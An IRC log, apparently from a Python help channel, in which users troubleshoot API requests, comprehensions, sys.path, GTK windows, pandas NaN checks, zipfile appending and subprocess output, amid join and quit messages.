[14:28:07] *** Quits: Avinash (~Avinash@unaffiliated/avinash) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[14:28:26] <ChrisWarrick> system python is best left ignored
[14:29:21] <joebobjoe> ChrisWarrick: ah
[14:29:31] <joebobjoe> you are correct. print(sys.path) shows no system dirs
[14:29:40] <joebobjoe> for homebrew's python3
[14:29:55] *** Quits: ycon_ (~ycon_@202-172-111-51-cpe.spintel.net.au) (Client Quit)
[14:31:27] *** Quits: nazarewk (~nazarewk@1d23810ffe137.rev.snt.net.pl) (Remote host closed the connection)
[14:31:28] <joebobjoe> except maybe user packages
[14:31:44] <AndroidKitKat> Hi guys, I'm having some issues trying to call a specific API. In my login function, I'm getting a 405 error, and I've bascially narrowed down the problem to line 16. Pastebin incoming
[14:31:50] <AndroidKitKat> Heres my python https://www.irccloud.com/pastebin/9z4roRjp/
[14:31:55] *** Joins: derk0pf (~derk0pf@p5497B8F0.dip0.t-ipconnect.de)
[14:31:57] <joebobjoe> homebrew python2 uses /Users/joebobjoe/Library/Python/2.7/lib/python/site-packages
[14:32:04] <joebobjoe> which seems like a system path to me
[14:32:09] <AndroidKitKat> https://www.irccloud.com/pastebin/YzYctuW2/loginInfo.json
[14:32:12] <joebobjoe> interesting that they use ~/Library
[14:32:20] <AndroidKitKat> and heres the specific api
[14:32:20] <ChrisWarrick> joebobjoe: so what/
[14:32:22] <AndroidKitKat> https://docs.listen.moe/api/account.html#login
[14:33:53] <SuperLag> If you attempt to install something with pip, and it fails, how do you clean up the packages it installs? do you have to remove them one by one?
[14:34:01] <ChrisWarrick> AndroidKitKat: You are supposed to send a POST request to /api/login (and don’t include type/route in the headers)
[14:34:05] *** Quits: vancha (~vancha@2a02:a211:2400:ba00:334d:6c58:6492:3c3b) (Quit: vancha)
[14:34:08] <joebobjoe> ChrisWarrick: macos python and homebrew python sys.path do intersect
[14:34:11] <ChrisWarrick> SuperLag: pip uninstall may or may not work — one by one
[14:34:20] *** Quits: Chizz8l (~Den@46-255.artnet.dn.ua) (Ping timeout: 276 seconds)
[14:34:24] <Falc> AndroidKitKat: not to be difficult, but you're getting an error 405 which their docs state is not, well, possible. So perhaps you should contact them?
[14:34:34] <joebobjoe> see other people have problems with pip's functionality too
[14:34:50] <ChrisWarrick> joebobjoe: Only in user-managed places.
[14:35:00] <joebobjoe> ChrisWarrick: so that is the exception
[14:35:06] *** Quits: LordVan (~LordVan@gentoo/developer/LordVan) (Quit: Verlassend)
[14:35:06] <Falc> joebobjoe: the exact same issue can happen with apt/yum
[14:35:27] <joebobjoe> Falc: guess I should try nix
[14:35:37] *** Quits: Alejoux (~Alejoux@2a01:e35:2e59:7ce0:78c8:602d:d850:3491) (Ping timeout: 245 seconds)
[14:35:44] <AndroidKitKat> ChrisWarrick: hmm, ok ill try to figure that out, but I'm turning up unsuccessful
[14:36:10] *** Quits: corretico (~corretico@186.4.59.151) (Ping timeout: 265 seconds)
[14:36:41] <ChrisWarrick> AndroidKitKat: requests.post('https://listen.moe/api/login', headers=info)   # and remove the top two things from your json file
[14:36:57] <AndroidKitKat> thanks ChrisWarrick i appreciate it
[14:38:13] <AndroidKitKat> hmm, still getting a 405
[14:38:31] *** Joins: lorddaed_ (~lorddaedr@78.157.211.238)
[14:39:00] <ChrisWarrick> AndroidKitKat: ugh, data=info
[14:39:12] *** Joins: lumm (~lumm@221.41.136.77.rev.sfr.net)
[14:39:29] <AndroidKitKat> Same thing
[14:39:32] <kevr> how would i stop a gtk window after ive already started it, without exiting the script i'm in? I'm using pygtk 3.0
[14:39:36] <kevr> (for 3.0)
[14:40:05] *** Quits: grateful (~grateful@unaffiliated/grateful) (Ping timeout: 276 seconds)
[14:40:11] *** Quits: theseb (~user@47-220-211-42.cnrocmta03.res.dyn.suddenlink.net) (Ping timeout: 276 seconds)
[14:40:14] <MrElendig> kevr: should consider not using pygtk if this is for a new project
[14:40:16] <ChrisWarrick> AndroidKitKat: In addition to the payload (data=), you also need some headers: https://docs.listen.moe/api/
[14:40:18] *** Joins: Isotop7 (d96ef072@gateway/web/freenode/ip.217.110.240.114)
[14:40:31] *** Quits: longbow (~longbow@vwifi-employee-579.lnu.se) (Ping timeout: 265 seconds)
[14:40:33] <AndroidKitKat> oh each request has to have that, thanks ChrisWarrick
[14:40:33] <MrElendig> what do you mean by "stop a window" though?
[14:40:34] *** Quits: zefferno (~zefferno@unaffiliated/zefferno) (Ping timeout: 264 seconds)
[14:41:10] *** Joins: grateful (~grateful@unaffiliated/grateful)
[14:41:38] *** Quits: lorddaedra (~lorddaedr@185.44.76.121) (Ping timeout: 256 seconds)
[14:41:52] *** Parts: takane2 (~tkane@2603:3005:2303:b100:9dec:14db:470f:a2f8) ()
[14:41:53] *** Joins: Spaaaaaaaaaaaace (~Spaaaaaaa@unaffiliated/spaaaaaaaaaaaace)
[14:42:02] <ytrezq> That’s the point of my question, how to use the Mimemultipart module for that ?[02/07/2018 15:30:45] <ikanobori> ytrezq: Then you join those plaintexts together in the format that S/MIME expects them which I don't know.
[14:42:09] *** Joins: _feuillemorte (irc@nat/redhat/x-zmttqnurvjponyoc)
[14:42:24] *** Quits: Arcaelyx (~Arcaelyx@2604:2000:f14a:2500:44b7:d903:69b3:3e53) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[14:42:30] *** Joins: teodorg (~teodorg@85.130.11.102)
[14:42:37] <ytrezq> ikanobori ?
[14:42:48] *** Quits: Cache_Money (~mas@c-24-18-214-173.hsd1.wa.comcast.net) (Quit: Cache_Money)
[14:44:02] *** Quits: feuillemorte (irc@nat/redhat/x-slragtzfzskhvrzd) (Ping timeout: 260 seconds)
[14:44:11] *** Joins: nelsnelson (~nelsnelso@rrcs-71-42-191-12.sw.biz.rr.com)
[14:44:13] <AndroidKitKat> thanks ChrisWarrick, got a different error, but since its a 500, its their problem, not mine
[14:44:29] <acetakwas> Why can't I have an if clause in a dict comprehension?
[14:44:31] <acetakwas>     f = {k: as_rel[k]['expanded'] for k, v in as_rel.iteritems()
[14:44:32] <acetakwas>          if k in expand else k: as_rel[k]['expanded']}
[14:44:52] *** Joins: Technodrome (~textual@unaffiliated/technodrome)
[14:44:56] *** Quits: Venomen (~venomen@unaffiliated/venomen) (Quit: Leaving...)
[14:44:56] *** Joins: Alejoux (~Alejoux@2a01:e35:2e59:7ce0:78c8:602d:d850:3491)
[14:44:57] *** Quits: AnySomebody (~AnySomebo@192.129.2.104) (Ping timeout: 240 seconds)
[14:45:09] *** Joins: Sinooko (~root@65-121-75-130.dia.static.qwest.net)
[14:45:49] <kevr> MrElendig: what should i use?
[14:45:53] <ChrisWarrick> acetakwas: you can’t have an else clause like that
[14:46:06] <MrElendig> kevr: gobject
[14:46:10] <kevr> MrElendig: basically, i'm trying to just pop up a battery overlay window when my battery gets too low, so i need to control it inside a "daemonized" script
[14:46:11] <acetakwas> ChrisWarrick: How can I have it?
[14:46:20] <kevr> MrElendig: ah
[14:46:24] <ChrisWarrick> acetakwas: what are you trying to do?
[14:46:39] *** Quits: semeion (~semeion@unaffiliated/semeion) (Read error: Connection reset by peer)
[14:46:57] <MrElendig> pygtk website even redirects to pygobject now
[14:47:09] <ChrisWarrick> acetakwas: list and dict comprehensions only allow an `if` to determine whether or not an element is included.  You can use a ternary `T if C else F` statement as part of the element (before `for`)
[14:47:19] <kevr> oh, i see, i am using that style
[14:47:30] <kevr> i guess it is gobject, or at least it's gi.repository
[14:47:45] <MrElendig> yea that is fine
[14:48:26] *** Quits: LiftLeft (~loser@2001:19f0:5c01:1cb2:5400:1ff:fe83:8bed) (Ping timeout: 255 seconds)
[14:48:27] *** Joins: Avinash (~Avinash@unaffiliated/avinash)
[14:48:37] <MrElendig> if it is the main window you are closing, then you might want to consider splitting your application into two seperate processes
[14:48:49] *** Quits: Johnjay (26780a63@gateway/web/freenode/ip.38.120.10.99) (Ping timeout: 260 seconds)
[14:49:12] *** Joins: stitched_unicorn (~textual@softbank126015064164.bbtec.net)
[14:49:13] *** Joins: LiftLeft (~loser@2001:19f0:5c01:1cb2:5400:1ff:fe83:8bed)
[14:49:16] <joebobjoe> why doesn't map(print, some_list) work?
[14:49:17] <kevr> Oh, man, i'm just an imbecile and i missed a line of logic.
[14:49:27] <kevr> putting it in a thread and calling Gtk.main_quit seems to work
[14:49:47] *** Joins: tr4cefl0w (~tr4cefl0w@165.227.230.14)
[14:49:48] *** Joins: toxync04 (~toxync04@124.239.252.98)
[14:50:00] <kevr> (in the glib.idle_add queue, at least)
[14:50:28] *** Quits: xliiv_ (~xliiv@d89-122.icpnet.pl) (Quit: Leaving)
[14:50:50] <acetakwas> ChrisWarrick: This works. Thanks.
[14:50:51] <acetakwas> {k: as_rel[k]['expanded'] if k in expand else as_rel[k]['url']
[14:50:51] <acetakwas>          for k, v in as_rel.iteritems()}
[14:50:54] <joebobjoe> nevermind. print(*some_list, sep="\n") works
[14:51:11] *** Quits: hemstock (hemstock@80.244.31.40) (Read error: Connection reset by peer)
[14:51:13] <Wooble> acetakwas: why not use v instead of as_rel[k]?
[14:51:38] <bjs> joebobjoe: to answer the original question: in python3, `map` is lazy and won't actually execute anything until you loop over it
[14:51:43] *** Joins: russoisraeli (~igor@pool-108-5-134-231.nwrknj.fios.verizon.net)
[14:51:46] <acetakwas> Wooble: This is what as_rel looks like:
[14:51:47] <acetakwas>     as_rel = {
[14:51:47] <acetakwas>         'accounts': {
[14:51:47] <acetakwas>             'expanded': [account.as_json for account in self.accounts],
[14:51:47] <acetakwas>             'url': url_for('api.get_customer_accounts', customer_id=self.id)
[14:51:47] <acetakwas>         }
[14:51:49] <acetakwas>     }
[14:51:58] <acetakwas> Sorry I'm pasting code here.
[14:52:03] <acetakwas> Though it'd be short.
[14:52:21] <Wooble> acetakwas: you're already getting the items, so it's silly to get the value again when you already have it.
[14:52:25] *** Quits: hortonew (hortonew@c-73-229-20-12.hsd1.co.comcast.net) (Ping timeout: 268 seconds)
[14:52:37] *** Joins: semeion (~semeion@unaffiliated/semeion)
[14:52:49] <acetakwas> Wooble: Oh. I get you.
[14:52:50] <acetakwas> My bad.
[14:53:09] *** Joins: fikka (~fikka@5403BEC5.catv.pool.telekom.hu)
[14:53:20] <acetakwas> Wooble: f = {k: v['expanded'] if k in expand else v['url'] for k, v in as_rel.iteritems()}
[14:53:22] <acetakwas> Thanks.
[14:53:24] *** Joins: codymj (~codymj@rrcs-71-41-86-116.se.biz.rr.com)
[14:53:26] *** Joins: hemstock (hemstock@80.244.31.40)
[14:53:36] *** Joins: zefferno (~zefferno@unaffiliated/zefferno)
[14:53:41] <Wooble> right, less repetition that way too.
[14:54:16] *** Joins: k_sze (~Kira@unaffiliated/kira)
[14:54:21] <joebobjoe> bjs: how do you reduce the map?
[14:54:50] <k_sze> By default, does pypi allow a package owner to re-upload a package with the same version number?
[14:54:59] <bjs> joebobjoe: by doing something that iterates over it: list(map(print, some_list)), or just to build a list directly: [print(x) for x in some_list]
[14:55:00] <dude-x> k_sze no.
[14:55:03] *** Quits: AquaL1te (~AquaL1te@unaffiliated/aqual1te) (Quit: leaving)
[14:55:13] <Wooble> joebobjoe: using map() for side effects isn't a great idea, though.
[14:55:21] *** Joins: akk (~akkana@75.161.148.9)
[14:55:24] *** Quits: akk (~akkana@75.161.148.9) (Max SendQ exceeded)
[14:55:27] <joebobjoe> Wooble: is there a foreach?
[14:55:36] <Wooble> joebobjoe: the for loop is a foreach.
[14:55:40] <russoisraeli> Good morning folks. I am trying to implement an OAuth server using Authlib, per the given examples/code. When calling "create_token_response", I get the following trace https://dpaste.de/rga4 . It fails when calling a registered function "query_client" -- https://dpaste.de/jVnj . If anyone has any experience with Authlib, please please help
[14:55:53] <joebobjoe> Wooble: so I have to use two lines
[14:56:02] *** Joins: akk (~akkana@75.161.148.9)
[14:56:04] *** Quits: akk (~akkana@75.161.148.9) (Max SendQ exceeded)
[14:56:14] *** Joins: agent_white (~agent_whi@unaffiliated/agent-white/x-6197888)
[14:56:17] <Wooble> joebobjoe: you can put it on the same line if you're in a code golf contest.
[14:56:20] *** Quits: chele (~chele@2a02:8106:1:f900:faca:b8ff:fe2f:8499) (Quit: Leaving)
[14:56:22] *** Quits: roadie (~user@2a02:8108:f40:17f1:953:d4f3:7b58:ff8d) (Ping timeout: 256 seconds)
[14:56:36] *** Joins: akk (~akkana@75.161.148.9)
[14:56:39] *** Quits: akk (~akkana@75.161.148.9) (Max SendQ exceeded)
[14:56:59] *** Quits: Sinooko (~root@65-121-75-130.dia.static.qwest.net) (Ping timeout: 276 seconds)
[14:57:00] *** Quits: RCStef (~Thunderbi@conect.gtstelecom.ro) (Quit: RCStef)
[14:57:06] *** Joins: akk (~akkana@75.161.148.9)
[14:57:09] *** Quits: akk (~akkana@75.161.148.9) (Max SendQ exceeded)
[14:57:12] *** Joins: kingrodi1n (~kingrodia@75.231.164.82.customer.cdi.no)
[14:57:41] *** Joins: akk (~akkana@75.161.148.9)
[14:57:51] <joebobjoe> sorry
[14:58:12] *** Quits: techalchemy (~Hawkerz@unaffiliated/hawkerz) (Quit: Leaving)
[14:58:15] *** Joins: kushalAgrawal (uid279683@gateway/web/irccloud.com/x-gfessvnkimtsicrp)
[14:58:20] *** Quits: fikka (~fikka@5403BEC5.catv.pool.telekom.hu) (Ping timeout: 260 seconds)
[14:58:21] *** Parts: Elodin (~weechat@unaffiliated/padawan) ("WeeChat 2.1")
[14:58:25] *** Quits: toxync04 (~toxync04@124.239.252.98) (Quit: ZNC 1.7.0 - https://znc.in)
[14:59:02] <Wooble> joebobjoe: (the purpose of map() and a list comprehension is to build an iterable/list of return values of the function you're mapping over; if your function is print(), which just returns None, building a list of Nones to throw away is both non-idiomatic and wasteful...)
[14:59:07] *** Quits: Isotop7 (d96ef072@gateway/web/freenode/ip.217.110.240.114) (Quit: Page closed)
[14:59:27] *** Joins: hortonew (~hortonew@2601:282:4203:41a0:e2cb:4eff:fed7:48db)
[14:59:27] *** Joins: urodna (~urodna@unaffiliated/urodna)
[14:59:55] *** Joins: toxync04 (~toxync04@101.64.179.230)
[15:00:01] *** Quits: purplex88 (~purplex88@unaffiliated/purplex88) (Ping timeout: 256 seconds)
[15:00:08] *** Joins: purplex88 (~purplex88@unaffiliated/purplex88)
[15:00:24] <joebobjoe> wish I could use syntax like [print(x) for x in some_list] without building a list
[15:00:39] *** Joins: sunil_bansal (~sunil_ban@183.82.16.215)
[15:00:45] <tos9> joebobjoe: You can, it's a for loop.
[15:01:14] <han-solo> '\n'.join(somelist) :) # i don't know
[15:01:31] <Wooble> for x in some_list: print(x)  it's even 1 byte shorter.
[15:02:03] *** Quits: Tucky (~Tucky@4.235.17.93.rev.sfr.net) (Remote host closed the connection)
[15:02:16] <joebobjoe> oh. didn't know you could do a for loop without a newline
[15:02:29] <tos9> You can, but why would you
[15:02:36] <Wooble> it's bad style, but so is a useless comprehension.
[15:02:39] <bjs> joebobjoe: Wooble did say earlier you can just put it on one line if you really want
[15:02:40] *** Joins: rjdp9736 (~rjdp9736@49.205.216.204)
[15:02:42] *** Joins: as2000 (~as2000@ip68-3-106-61.ph.ph.cox.net)
[15:02:43] *** Quits: m0j0dj0dj0 (~punk3r@unaffiliated/m0j0dj0dj0) (Quit: go drink with my bitches!)
[15:02:43] <joebobjoe> piping in stuff to python3 on command line
[15:02:48] <joebobjoe> short "one-liners"
[15:02:57] <tos9> joebobjoe: so what?
[15:02:59] <bjs> joebobjoe: you can pipe newlines?
[15:02:59] <WhileTrue> bjs, I cannot thank you enough for your generous, insightful help here! The flow of execution of loops with return statement arose some confusion but viewing back former snippets, I was able to get these right
[15:03:00] <tos9> why's it have to be one line
[15:03:17] <han-solo> it's FOOBAR, is what it is :)
[15:03:19] *** Joins: qlixed (~qlixed@190.221.31.178)
[15:03:23] <han-solo> FUBAR ?
[15:03:34] *** Quits: subho (~subho@fedora/subho) (Quit: laptop going to sleep. ZZZzzz…)
[15:03:37] *** Joins: fassl (80838e22@gateway/web/freenode/ip.128.131.142.34)
[15:03:39] <Wooble> python isn't particularly well suited to being a command-line perl/awk replacement, but to each their own I guess.
[15:03:42] *** Joins: Cache_Money (~mas@50-233-152-194-static.hfc.comcastbusiness.net)
[15:04:03] *** Joins: HaikUbuntu (~haikubunt@37.173.217.59)
[15:04:11] <joebobjoe> tos9 bjs: yea but I didn't realize you could echo for x in some_list: print(x) | python3
[15:04:30] <joebobjoe> I thought it would have to be echo "for x in some_list:\nprint(x)" | python3
[15:04:31] <tos9> joebobjoe: you're echoing *python* code into python3? why?
[15:04:51] *** Quits: sunil_bansal (~sunil_ban@183.82.16.215) (Ping timeout: 240 seconds)
[15:04:58] <joebobjoe> because I want to be able to pipe the output into a shell variable
[15:05:06] *** Joins: JudeauChop (~JudeauCho@2601:282:8300:18fe:1cc8:97e3:3a96:400f)
[15:05:19] <bjs> joebobjoe: sure but you can just echo newlines and pipe those too
[15:05:27] <tos9> I don't follow, but usually this train of thought is a misunderstanding about how shells work
[15:05:35] <tos9> joebobjoe: are you aware shells are just fine with newlines?
[15:05:38] *** Quits: Sepultura (~Sepultura@unaffiliated/sepultura) (Quit: Going offline, see ya! (www.adiirc.com))
[15:05:39] *** Quits: derk0pf (~derk0pf@p5497B8F0.dip0.t-ipconnect.de) (Ping timeout: 265 seconds)
[15:05:44] <joebobjoe> yes
[15:05:45] <han-solo> echo x for x in range(10): print(x) | python
[15:05:45] <han-solo> bash: syntax error near unexpected token `('
[15:05:55] <tos9> joebobjoe: then why would you ever pipe python code into python
[15:05:55] <han-solo> s/x// # even :)
[15:05:57] *** Quits: RickDeckard (~tgburrin@108.60.152.194) (Ping timeout: 240 seconds)
[15:06:04] <NoImNotNineVolt> tos9: entering multiline scripts in the shell makes for ugly commands.
[15:06:10] <tos9> NoImNotNineVolt: How so?
[15:06:18] <joebobjoe> ^
[15:06:18] <dude-x> there's always xonsh if you want shell and python
[15:06:19] <umbSublime> why not use `pytho3 -c "<expression>"`
[15:06:25] <umbSublime> python3*
[15:06:45] <joebobjoe> tos9: I want to store sys.path in a shell variable
[15:06:49] <Wooble> (or just write your whole thing in python instead of involving a shell in programming)
[15:06:51] *** Quits: pathrocle (~pathrocle@46.97.4.154) (Ping timeout: 240 seconds)
[15:06:55] <NoImNotNineVolt> `foo | perl -E 'some script' | bar` is considerably less legible if 'some script' is multiple lines.
[15:06:58] <bjs> joebobjoe: what, why?
[15:07:24] <tos9> joebobjoe: that'd be quite weird :), but yes, syspath=$(python -c 'import sys; print(",".join(sys.path))')
[15:07:27] *** Joins: RickDeckard (~tgburrin@152.179.78.138)
[15:07:35] *** Quits: ecdhe (~quassel@unaffiliated/ecdhe) (Read error: Connection reset by peer)
[15:07:44] *** Joins: pathrocle (~pathrocle@ldap.nchadvisors.ro)
[15:07:52] *** Joins: ecdhe (~quassel@unaffiliated/ecdhe)
[15:08:16] <joebobjoe> tos9: why use ' quotes vs "?
[15:08:21] <joebobjoe> for the outer quote
[15:08:36] *** Joins: UncleVasya_ (~UncleVasy@185-94-213-142.dynamic.ktkru.ru)
[15:08:36] *** Quits: GraysonBriggs (~GraysonBr@206-51-126-226.up.net) (Read error: Connection reset by peer)
[15:08:38] <NoImNotNineVolt> to avoid having to escape things from the shell?
[15:08:38] <tos9> joebobjoe: because both your shell and Python need quoting there, and '' is better to use for a shell unless you need "".
[15:08:39] *** Joins: m3ddl3r (~Thunderbi@192.30.201.10)
[15:08:45] *** Joins: greg_f (~greg@altlinux/developer/greg)
[15:08:47] <joebobjoe> bjs: because I want to examine and compare sys.patah from different python versions
[15:08:57] *** Quits: graphene (~graphene@46.101.134.251) (Remote host closed the connection)
[15:08:58] *** Joins: Fulgen_ (~Fulgen@078132058052.public.t-mobile.at)
[15:09:02] *** Quits: drymer (~drymer@unaffiliated/drymer) (Max SendQ exceeded)
[15:09:06] <tos9> joebobjoe: then you'd use python -m site, not that
[15:09:07] *** Quits: Fulgen (~Fulgen@078132058052.public.t-mobile.at) (Read error: Connection reset by peer)
[15:09:11] *** Joins: tty14 (~azuri5@14.143.147.182)
[15:09:15] *** Quits: fassl (80838e22@gateway/web/freenode/ip.128.131.142.34) (Quit: Page closed)
[15:09:15] <tos9> e.g., `diff <(python -m site) <(otherpython -m site)`
[15:09:23] *** Joins: rpkilby (~rpkilby@152.7.255.195)
[15:09:54] *** Quits: BeforeClick (a5e148ed@gateway/web/freenode/ip.165.225.72.237) (Quit: Page closed)
[15:09:58] *** Quits: anthepro (~anthepro@unaffiliated/anthepro) (Ping timeout: 264 seconds)
[15:10:11] *** Joins: drymer (~drymer@unaffiliated/drymer)
[15:10:12] *** Quits: UncleVasya (~UncleVasy@185-94-213-142.dynamic.ktkru.ru) (Read error: Connection reset by peer)
[15:10:20] <joebobjoe> wow did not know that existed
[15:10:21] *** Joins: GraysonBriggs (~GraysonBr@206-51-126-226.up.net)
[15:10:53] <han-solo> git diff  --no-index <(python -m site) <(python -m site | grep dist)
[15:10:58] *** Joins: chachan (~chachan@168.232.28.50)
[15:11:07] <tos9> han-solo: obviously your `diff` should be an alias for git diff :)
[15:11:10] *** Quits: azuri5 (~azuri5@14.143.147.182) (Ping timeout: 264 seconds)
[15:11:13] <han-solo> er
[15:11:23] <han-solo> tos9: Yes :)
[15:11:23] <tos9> (mine is :)
[15:11:34] <NoImNotNineVolt> wat
[15:11:38] <NoImNotNineVolt> what's wrong with diffutils?
[15:11:42] *** Joins: psychicist__ (~psychicis@5356A22B.cm-6-7c.dynamic.ziggo.nl)
[15:11:52] <tos9> NoImNotNineVolt: color and byte-default (assuming your git is)
[15:11:55] *** Parts: Pishogue (~Zebeck@138.197.105.246) ("The Lounge - https://thelounge.github.io")
[15:12:06] <tos9> you can replicate git diff with wdiff + colordiff but hey who needs 3 tools to do what git already does
[15:12:13] <tos9> someone should add an operating system to git then I wouldn't have to use linux
[15:12:26] <NoImNotNineVolt> "linux is just the kernel, gnu is the OS" :P
[15:12:28] <cdunklau> inb4 emacs
[15:12:39] *** Quits: Draecos (~Draecos@203.121.220.138) (Quit: This computer has gone to sleep)
[15:13:01] <Wooble> git still doesn't even have tetris built in.
[15:13:24] *** Quits: enterprisey (~enterpris@wikipedia/enterprisey) (Remote host closed the connection)
[15:13:29] <TML> han-solo: I was curious to see how that was different from my normal 'diff(1)', but all that command gives me is: error: /dev/fd/63: unsupported file type
[15:13:50] *** Joins: anthepro (~anthepro@unaffiliated/anthepro)
[15:14:03] *** Quits: Nickeeh (~quassel@bulbasaur.sjorsgielen.nl) (Quit: No Ping reply in 180 seconds.)
[15:14:23] *** Quits: akar (~user@139.0.79.67) (Ping timeout: 256 seconds)
[15:14:45] *** Joins: newpy (~ops2@lsvl-pf.massivenetworks.net)
[15:14:51] <newpy> I'm trying to use numpy.isnan()
[15:15:14] <newpy> and I keep getting TypeError: ufunc 'isnan' not supported for the input types, and the inputs could not be safely coerced to any supported types according to the casting rule ''safe''
[15:15:21] *** Joins: Nickeeh (~quassel@bulbasaur.sjorsgielen.nl)
[15:15:26] <newpy> I have a pandas dataframe
[15:15:31] <Wooble> newpy: what are the types?
[15:15:44] <newpy> Wooble, let me check, I think either string or nan
[15:15:48] <han-solo> TML: Oh, yeah, it gave me an error, i was seeing how to make that work
[15:15:56] <tos9> you need =
[15:15:59] <tos9> because git is overly cleverl
[15:16:03] <Wooble> newpy: well, you can't check is a string is NaN. You'll need a number.
[15:16:19] <newpy> Wooble, can I check if a nan is type string?
[15:16:34] <Wooble> newpy: I don't even know what that would mean.
[15:16:39] <newpy> Wooble, actually I'll just do if(type(loc) == 'str'):
[15:16:41] *** Quits: rpkilby (~rpkilby@152.7.255.195) (Remote host closed the connection)
[15:16:46] *** Quits: ThiefMaster` (adrian@indico/developer/thiefmaster) (Ping timeout: 256 seconds)
[15:16:47] <nanonyme>  :(
[15:16:59] <newpy> Wooble, yea the empty cells are type "float"
[15:17:03] <newpy> so I can just check for type()
[15:17:14] <tos9> newpy: there are at least 3 mistakes in that one line :) please don't do that.
[15:17:19] <CrtxReavr> type() doesn't return a string.
[15:17:29] <CrtxReavr> It returns a type-callable.
[15:18:01] <han-solo> isinstance
[15:18:05] *** Joins: giaco (~giaco@2-238-151-49.ip244.fastwebnet.it)
[15:18:16] <nanonyme> NaN kinda sucks for comparisons since it's meant to compare false to everything
[15:18:16] *** Joins: j0seph (~quassel@unaffiliated/imj0seph)
[15:18:21] *** Joins: dfee4 (~dfee@cpe-70-95-143-62.san.res.rr.com)
[15:18:26] <Wooble> I bet pandas has a better way to check whatever you're trying to check.
[15:18:36] <nanonyme> (even itself)
[15:18:45] <Wooble> (or to avoid mixing floats and strings in the first place)
[15:20:04] *** Joins: root3d (~root3d@unaffiliated/root3d)
[15:20:04] *** Joins: httperr418 (~ashitaka@93-97-213-242.zone5.bethere.co.uk)
[15:20:18] <httperr418> hi, I'm having issues with the zipfile module
[15:20:27] <joebobjoe> TML: were you able to get the git diff to work?
[15:21:22] <httperr418> I'm opening with zipfile.Zipfile(path, 'a', zipfile.ZIP_DEFLATED) in order to add new files to an existing archive
[15:21:36] <httperr418> but what I'm actually finding is that it overwrites the existing archive
[15:21:41] <httperr418> what have I done wrong?
[15:21:46] *** Quits: Alejoux (~Alejoux@2a01:e35:2e59:7ce0:78c8:602d:d850:3491) (Quit: Leaving)
[15:22:04] *** Joins: Alejoux (~Alejoux@2a01:e35:2e59:7ce0:78c8:602d:d850:3491)
[15:22:09] *** Quits: ferdna (~ferdna@68-73-71-246.lightspeed.elpstx.sbcglobal.net) (Quit: Leaving)
[15:22:25] <httperr418> version is 3.5
[15:22:26] *** Quits: carl-- (~carl-@h-213-136-53-77.NA.cust.bahnhof.se) (Ping timeout: 256 seconds)
[15:22:30] *** Joins: rpkilby (~rpkilby@152.7.255.194)
[15:22:35] *** Joins: TeaPanda (~TeaPanda@unaffiliated/teapanda)
[15:22:43] <Yhg1s> httperr418: how are you adding files to it?
[15:22:50] *** Quits: as2000 (~as2000@ip68-3-106-61.ph.ph.cox.net) (Quit: Leaving)
[15:23:02] <newpy> hmm
[15:23:10] *** Quits: psi29a (~psi29a@129.253.244.4) (Quit: Leaving.)
[15:23:40] *** Joins: davr0s (~textual@host86-138-235-28.range86-138.btcentralplus.com)
[15:23:43] *** Joins: AnySomebody (~AnySomebo@p2003005F2814A396A097A2FFFE5553BE.dip0.t-ipconnect.de)
[15:24:41] *** Joins: DeaDSouL (~DeaDSouL@45.123.117.4)
[15:24:42] <odinsbane> If I compile/build a wheel file for tensorflow, should I be able to use that wheel file on another computer with the same os/architecture?
[15:25:19] <httperr418> Yhg1s: oh, didn't realise there were options that made a difference
[15:25:26] <httperr418> hang on, going to have to disconnect to check that part
[15:25:35] *** Quits: j0seph (~quassel@unaffiliated/imj0seph) (Ping timeout: 240 seconds)
[15:26:33] *** Joins: jlf (~jlf@pdpc/supporter/active/jlf)
[15:26:36] *** Joins: corretico (~corretico@200.91.143.34)
[15:26:45] <Yhg1s> odinsbane: yes, as long as you have the same dependencies installed.
[15:26:53] <Yhg1s> (and/or the wheel contains all the dependencies)
[15:27:50] *** Joins: roadie (~user@2a02:8108:f40:17f1:953:d4f3:7b58:ff8d)
[15:28:18] *** Joins: rudrab (~rudrab@14.139.59.140)
[15:28:26] <httperr418> just with ZipFile.write(file, arcname=name)
[15:28:38] *** Quits: enriq (~pitagoras@190.104.249.158) (Read error: Connection reset by peer)
[15:28:50] *** Joins: m0j0dj0dj0 (~punk3r@unaffiliated/m0j0dj0dj0)
[15:28:51] *** Quits: grateful (~grateful@unaffiliated/grateful) (Ping timeout: 265 seconds)
[15:29:07] *** Quits: root3d (~root3d@unaffiliated/root3d) (Remote host closed the connection)
[15:29:25] *** Joins: enriq (~pitagoras@190.104.249.158)
[15:30:06] *** Quits: b3h3m0th (uid26288@gateway/web/irccloud.com/x-vokygfswfibonlrm) (Quit: Connection closed for inactivity)
[15:30:22] <httperr418> my understanding was that the way you called write() didn't matter, it was about how you opened the archive in the first place
[15:30:29] <rodskagg> just used process= subprocess.Popen(["ls","/tmp"], stdout=subprocess.PIPE) and the result was b'44397.blend\nICRC_PERF_COUNTER\nICRC_ROLL.lck\nblender_4cp3X0\nblender_9an9gi\nblender_LrLNFl\nblender_P5gxOf\nblender_QEsag3\nblender_THvnjZ\nblender_U3ZcNZ\nblender_porQqu\ncom.apple.launchd.HZWhwW1CNK\ncom.apple.launchd.J1JPP2Bd0Q\ncom.apple.launchd.eBPfHsgoKY\ncom.trendmicro.tmsm.run.plist\ndc.mtl\ndc.obj\ndc.py\nmysql.sock\nmysql.sock.lock\nmysqlx.sock\nmysqlx
[15:30:42] *** Quits: rpkilby (~rpkilby@152.7.255.194) (Remote host closed the connection)
[15:31:05] <rodskagg> b = byte? aka ascii?
[15:31:41] <NoImNotNineVolt> bonus points for assuming ascii.
[15:31:44] <Yhg1s> rodskagg: not necessarily ASCII, but bytes, yes.
[15:31:57] *** Quits: Falc (~LaurentDB@193.191.206.243) (Ping timeout: 240 seconds)
[15:32:03] <rodskagg> python3 strings are all unicode right?
[15:32:06] *** Joins: rromans (~rromans@unaffiliated/rrrobbb)
[15:32:23] <Yhg1s> rodskagg: if you want subprocess to give you strings, use univeral_newlines=True.
[15:32:29] *** Joins: akar (~user@103.47.132.51)
[15:32:37] <Yhg1s> rodskagg: or, decode the bytes yourself.
[15:32:44] <rodskagg> gotcha.
[15:32:57] *** Joins: root3d (~root3d@unaffiliated/root3d)
[15:33:20] *** Quits: ThiefMaster (thief@indico/developer/thiefmaster) (Ping timeout: 256 seconds)
[15:34:30] *** Quits: cryptic (~cryptic@142.196.170.87) (Ping timeout: 260 seconds)
[15:34:42] *** Quits: enriq (~pitagoras@190.104.249.158) (Read error: Connection reset by peer)
